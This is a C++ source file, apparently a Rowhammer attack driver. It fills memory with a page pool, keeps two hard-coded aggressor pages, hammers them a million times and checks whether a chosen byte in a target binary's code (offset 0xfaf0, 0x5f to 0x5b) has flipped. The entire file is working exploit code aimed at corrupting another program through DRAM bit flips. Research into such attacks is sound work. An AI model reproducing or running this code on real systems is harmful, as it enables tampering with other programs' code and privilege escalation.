#include "iostream"
#include "sstream"
#include "string"
#include "cstdlib"
#include "vector"
#include "libhammer.h"

using namespace std;

const string green="\033[0;32m", blue="\033[1;34m", red="\033[1;31m", yellow="\033[0;33m", restore="\033[0m";

uint64_t _mb(uint64_t b)
{
    return b / 1024000ull;
}

uint64_t get_binary_pa_offset(const string &path, uint64_t offset)
{
    int fd;
    unsigned sz;
    struct stat st;
    void *image;
    uint64_t ret;

    ASSERT(-1 != (fd = open(path.c_str(), O_RDONLY)) );
    fstat(fd, &st);
    sz = st.st_size;

    ASSERT(0 != (image = mmap(0, sz, PROT_READ, MAP_PRIVATE, fd, 0)) );
    mlock(image, sz);
    ret = v2p(image+offset);

    munlock(image, sz);
    close(fd);
    munmap(image, sz);
    return ret;
}

int main(int argc, char **argv)
{
    BinaryInfo target;

    target.path = "./target";
    target.flip_to = 0;
    target.offset = 0xfaf0;
    target.orig = 0x5f;
    target.target = 0x5b;

    HammerResult hr("0x5988000,2800,0x5966000,0x59ab000,0xfb,0");

    uint64_t avail_size, pool_size, target_pa, i, tmp=0;
    Page a, b;
    stringstream ss; ss.clear();

    avail_size = get_available_mem();
    pool_size = (uint64_t)(avail_size * 0.9);
    pool_size -= pool_size % PAGE_SIZE;
    cout << blue << "- Available mem: " << _mb(avail_size) << "M, pool size: " << _mb(pool_size) << "M." << endl;
    cout << "- target pa=0x" << hex << get_binary_pa_offset(target.path, target.offset) << restore << endl;


    {
        vector<Page> pool;

        pool = allocate_mb(_mb(pool_size));

        for (Page pg : pool)
        {
            pg.get<uint64_t>(0) = pg.p; // access

            if (pg.p == hr.p)
            {
                cout << green << "Got page A: " << hex << pg.p << endl;
                mlock(pg.v.get(), PAGE_SIZE);
                a = pg;
            }
            if (pg.p == hr.q)
            {
                cout << green << "Got page B: " << hex << pg.p << endl;
                mlock(pg.v.get(), PAGE_SIZE);
                b = pg;
            }
        }
        for (Page pg : pool)
            if (!(pg == a || pg == b)) pg.reset();
    }

    if (a.p && b.p)
    {
        cout << blue << "* Start waylaying now (manually)..." << endl;
        pause();
        cout << green << "- Check original program..." << restore << endl;
        system("./target");
        cout << blue << "* Hammering 1000000 times..." << endl;
        hammer_loop(a.v.get(), b.v.get(), 1000000, 0);
        cout << green << "- Check result" << endl;
        system("./target");
    }
    else
    {
        cout << yellow << "* Cannot hold attack pages 0x" << hex << hr.p << ", 0x" << hr.q << ". Exit..." << endl;
    }
    return 0;
}
